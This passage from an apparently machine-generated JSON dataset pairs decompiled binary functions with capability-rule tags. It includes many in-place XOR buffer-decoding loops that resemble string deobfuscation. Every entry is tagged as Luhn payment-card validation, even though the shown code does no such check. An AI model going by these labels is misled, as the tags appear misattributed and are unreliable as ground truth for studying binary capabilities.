        "decompiled_code": "\nint32_t __cdecl fcn.00017e30(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 0xe; var_4h = var_4h + 1) {\n        if ((arg_8h & *(var_4h * 8 + -0x4e3a6998)) == 0) {\n            *(arg_ch + var_4h * 2) = 0x2d;\n        }\n        else {\n            *(arg_ch + var_4h * 2) = *(var_4h * 8 + -0x4e3a6994);\n        }\n    }\n    *(arg_ch + var_4h * 2) = 0;\n    return arg_ch;\n}\n",
        "token_count": 189
    },
    "00018f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00018f30(void)\n\n{\n    if (*0xb1c5a934 != '\\0') {\n        *0xb1c5a934 = '\\0';\n        fcn.00037270(0xb1c5998c, 0);\n        fcn.00037220(0xb1c5998c);\n        fcn.0001a270();\n        fcn.00034550(0xb1c5a938);\n        fcn.000345c0(0xb1c5a938);\n        fcn.000371b0(0xb1c5a93c);\n        fcn.00034520(0xb1c5a938);\n        fcn.00035330(*0xb1c5b05c);\n        fcn.00078790(0xb1c5a938, 0, 0x728);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "000198c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.000198c0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        if (*0xb1c5a934 == '\\0') {\n            return 0;\n        }\n        iVar1 = fcn.00019940(&var_4h, &var_8h);\n        if (iVar1 != 0) {\n            fcn.0001a270();\n            fcn.00019bc0(var_4h, var_8h);\n        }\n        if (*0xb1c5a934 == '\\0') break;\n        fcn.000209a0(1000);\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "0001a550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a550(uint arg_8h)\n\n{\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 34
    },
    "0001cf80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001cf80(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_110h;\n    uint var_108h;\n    \n    iVar1 = fcn.000368a0(arg_ch, &var_108h, 0x104);\n    if (((iVar1 != 0) && (arg_10h != '\\0')) && (iVar1 = fcn.0007861c(&var_108h, 0xb1bde7ac),  iVar1 == 0)) {\n        fcn.0001a8e0(&var_110h, 0xb1be2a50, 1);\n        fcn.00037220(&var_110h);\n        fcn.0001a8e0(&var_110h, 0xb1be9f60, 0);\n        fcn.00037220(&var_110h);\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "0001ea20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0001ea20(uint param_1)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c5a937 != '\\0') {\n        *0xb1c5a937 = '\\0';\n        fcn.00063a90(*0xb1c5b2f0, param_1);\n        fcn.000635f0(0xb1c5b2f0);\n        fcn.00063a90(*0xb1c5b2f8);\n        fcn.000635f0(0xb1c5b2f8);\n        fcn.00063a90(*0xb1c5b2ec);\n        fcn.000635f0(0xb1c5b2ec);\n        fcn.00063a90(*0xb1c5b2fc);\n        fcn.000635f0(0xb1c5b2fc);\n        fcn.00063a90(*0xb1c5b2e8);\n        fcn.000635f0(0xb1c5b2e8);\n        fcn.00063a90(*0xb1c5b2f4);\n        fcn.000635f0(0xb1c5b2f4);\n        fcn.0001b8c0();\n        fcn.000371b0(0xb1c5b330);\n        for (var_4h = 0; var_4h < *0xb1c5b2dc; var_4h = var_4h + 1) {\n            fcn.00035330(*(*0xb1c5b2e0 + var_4h * 4));\n        }\n        fcn.00035330(*0xb1c5b2e0);\n    }\n    return;\n}\n",
        "token_count": 420
    },
    "00020a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020a20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.000209e0(arg_8h, arg_ch, arg_10h, &arg_14h);\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "00021220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00021220(uint arg_8h)\n\n{\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 33
    },
    "00022f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022f50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_4h;\n    \n    uVar1 = *(arg_8h + 0x1c) + arg_ch;\n    if (uVar1 < *(arg_8h + 0xc) || uVar1 == *(arg_8h + 0xc)) {\n        var_4h = *(arg_8h + 0xc);\n    }\n    else {\n        var_4h = (((uVar1 - *(arg_8h + 0xc)) + -1 + *(arg_8h + 0x14)) / *(arg_8h + 0x14)) * *(arg_8h + 0x14) +\n                 *(arg_8h + 0xc);\n    }\n    return var_4h;\n}\n",
        "token_count": 203
    },
    "00023aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023aa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    *(arg_8h + 0x2c) = *(arg_8h + 0x2c) + arg_ch;\n    (**(*(arg_8h + 0x44) + 0x18))(*(arg_8h + 0x48), arg_8h + 8, 0x2c, 0);\n    return;\n}\n",
        "token_count": 107
    },
    "00024990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00024990(uint noname_0, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00029970(arg_10h + 100, 0, arg_ch, 0, 0);\n    return;\n}\n",
        "token_count": 60
    },
    "00025200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00025200(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00035490(*arg_8h);\n    *arg_8h = uVar1;\n    uVar1 = fcn.00035490(arg_8h[1]);\n    arg_8h[1] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[2]);\n    arg_8h[2] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[3]);\n    arg_8h[3] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[8]);\n    arg_8h[8] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[9]);\n    arg_8h[9] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[10]);\n    arg_8h[10] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[0xb]);\n    arg_8h[0xb] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[0xc]);\n    arg_8h[0xc] = uVar1;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        uVar1 = fcn.00035490(arg_8h[var_4h + 4]);\n        arg_8h[var_4h + 4] = uVar1;\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "00026a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00026a90(uint noname_0, uint arg_ch)\n\n{\n    fcn.00035330(arg_ch);\n    return;\n}\n",
        "token_count": 36
    },
    "00026bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00026bb0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00035490(*arg_8h);\n    *arg_8h = uVar1;\n    uVar1 = fcn.00035490(arg_8h[1]);\n    arg_8h[1] = uVar1;\n    uVar1 = fcn.00035490(arg_8h[2]);\n    arg_8h[2] = uVar1;\n    uVar1 = fcn.00035490(*(arg_8h + 0xd));\n    *(arg_8h + 0xd) = uVar1;\n    uVar1 = fcn.00035490(*(arg_8h + 0x11));\n    *(arg_8h + 0x11) = uVar1;\n    uVar1 = fcn.00035490(*(arg_8h + 0x15));\n    *(arg_8h + 0x15) = uVar1;\n    uVar1 = fcn.00035490(*(arg_8h + 0x19));\n    *(arg_8h + 0x19) = uVar1;\n    uVar1 = fcn.00035490(*(arg_8h + 0x1d));\n    *(arg_8h + 0x1d) = uVar1;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        uVar1 = fcn.00035490(*(arg_8h + var_4h * 4 + 0x21));\n        *(arg_8h + var_4h * 4 + 0x21) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "000273a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000273a0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (0x1b < var_4h) {\n            return 0x21590001;\n        }\n        if (*(var_4h * 8 + -0x4e3a6bc8) == arg_ch) break;\n        var_4h = var_4h + 1;\n    }\n    uVar1 = (**(var_4h * 8 + -0x4e3a6bc4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00029470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00029470(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_70h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00029090(arg_8h, &var_70h, 100, &var_8h);\n    if (iVar1 == 0) {\n        arg_ch = fcn.00035eb0(&var_70h, &var_4h, 0);\n    }\n    return arg_ch;\n}\n",
        "token_count": 124
    },
    "0002a030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002a030(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00020650(arg_10h, 0x11, 2, &var_4h, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        uVar2 = fcn.00028610(0xfffffffe, 4, var_4h + 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 148
    },
    "0002b290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002b290(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00066c80();\n    *(arg_8h + 0x11c) = uVar1;\n    *(arg_8h + 0x118) = 1;\n    uVar1 = fcn.0005cbd0(*(arg_8h + 0x11c), arg_ch, arg_10h, arg_14h, arg_8h + 4);\n    return uVar1;\n}\n",
        "token_count": 149
    },
    "0002b550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b550(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58c07 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58bc8) = *(var_4h + 0xb1c58bc8) ^ *(var_4h + 0xb1c58b88);\n        }\n    }\n    return 0xb1c58bc8;\n}\n",
        "token_count": 136
    },
    "0002b5b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b5b0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58c87 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58c48) = *(var_4h + 0xb1c58c48) ^ *(var_4h + 0xb1c58c08);\n        }\n    }\n    return 0xb1c58c48;\n}\n",
        "token_count": 138
    },
    "0002b610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b610(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58d07 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58cc8) = *(var_4h + 0xb1c58cc8) ^ *(var_4h + 0xb1c58c88);\n        }\n    }\n    return 0xb1c58cc8;\n}\n",
        "token_count": 136
    },
    "0002b670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b670(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58d87 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58d48) = *(var_4h + 0xb1c58d48) ^ *(var_4h + 0xb1c58d08);\n        }\n    }\n    return 0xb1c58d48;\n}\n",
        "token_count": 136
    },
    "0002b6d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b6d0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58e07 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58dc8) = *(var_4h + 0xb1c58dc8) ^ *(var_4h + 0xb1c58d88);\n        }\n    }\n    return 0xb1c58dc8;\n}\n",
        "token_count": 138
    },
    "0002b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b730(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58e87 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58e48) = *(var_4h + 0xb1c58e48) ^ *(var_4h + 0xb1c58e08);\n        }\n    }\n    return 0xb1c58e48;\n}\n",
        "token_count": 136
    },
    "0002b790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b790(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58f07 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58ec8) = *(var_4h + 0xb1c58ec8) ^ *(var_4h + 0xb1c58e88);\n        }\n    }\n    return 0xb1c58ec8;\n}\n",
        "token_count": 136
    },
    "0002b7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b7f0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c58f87 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58f48) = *(var_4h + 0xb1c58f48) ^ *(var_4h + 0xb1c58f08);\n        }\n    }\n    return 0xb1c58f48;\n}\n",
        "token_count": 138
    },
    "0002b850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b850(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59007 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c58fc8) = *(var_4h + 0xb1c58fc8) ^ *(var_4h + 0xb1c58f88);\n        }\n    }\n    return 0xb1c58fc8;\n}\n",
        "token_count": 135
    },
    "0002b8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b8b0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59087 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c59048) = *(var_4h + 0xb1c59048) ^ *(var_4h + 0xb1c59008);\n        }\n    }\n    return 0xb1c59048;\n}\n",
        "token_count": 133
    },
    "0002b910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b910(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59107 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c590c8) = *(var_4h + 0xb1c590c8) ^ *(var_4h + 0xb1c59088);\n        }\n    }\n    return 0xb1c590c8;\n}\n",
        "token_count": 134
    },
    "0002b970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b970(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59187 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c59148) = *(var_4h + 0xb1c59148) ^ *(var_4h + 0xb1c59108);\n        }\n    }\n    return 0xb1c59148;\n}\n",
        "token_count": 131
    },
    "0002b9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b9d0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59207 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c591c8) = *(var_4h + 0xb1c591c8) ^ *(var_4h + 0xb1c59188);\n        }\n    }\n    return 0xb1c591c8;\n}\n",
        "token_count": 136
    },
    "0002ba30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002ba30(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59287 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c59248) = *(var_4h + 0xb1c59248) ^ *(var_4h + 0xb1c59208);\n        }\n    }\n    return 0xb1c59248;\n}\n",
        "token_count": 131
    },
    "0002ba90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002ba90(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59307 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c592c8) = *(var_4h + 0xb1c592c8) ^ *(var_4h + 0xb1c59288);\n        }\n    }\n    return 0xb1c592c8;\n}\n",
        "token_count": 134
    },
    "0002baf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002baf0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59387 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c59348) = *(var_4h + 0xb1c59348) ^ *(var_4h + 0xb1c59308);\n        }\n    }\n    return 0xb1c59348;\n}\n",
        "token_count": 132
    },
    "0002bb50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bb50(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c59407 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0xb1c593c8) = *(var_4h + 0xb1c593c8) ^ *(var_4h + 0xb1c59388);\n        }\n    }\n    return 0xb1c593c8;\n}\n",
        "token_count": 134
    },
    "0002bbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bbb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b550();\n    fcn.00078556(arg_8h, arg_ch, 0xb1be1634, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bbe0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b5b0(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 87
    },
    "0002bc10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bc10(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b5b0();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1660, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bc40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bc40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b610();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1668, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "0002bc70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bc70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b670();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1668, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "0002bca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bca0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b610();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1628, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002bcd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bcd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b670();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be1628, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "0002bd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bd00(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b610();\n    fcn.00078556(arg_8h, arg_ch, 0xb1be1674, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bd30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bd30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b6d0();\n    fcn.00078556(arg_8h, arg_ch, 0xb1be1684, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 99
    },
    "0002bd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bd60(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b730();\n    fcn.00078556(arg_8h, arg_ch, 0xb1be1684, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bd90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b790();\n    fcn.00078556(arg_8h, arg_ch, 0xb1be1634, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bdc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bdc0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b7f0();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be169c, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0002bdf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bdf0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b850();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be169c, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002be20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002be20(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b8b0();\n    fcn.0007866a(arg_8h, arg_ch, 0xb1be169c, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002be50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002be50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b910(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "0002be80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002be80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b970(arg_ch);\n    fcn.00078652(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "0002beb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002beb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b910();\n    fcn.00078556(arg_8h, arg_ch, 0xb1bde644, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002bee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bee0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b970();\n    fcn.00078556(arg_8h, arg_ch, 0xb1bde644, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
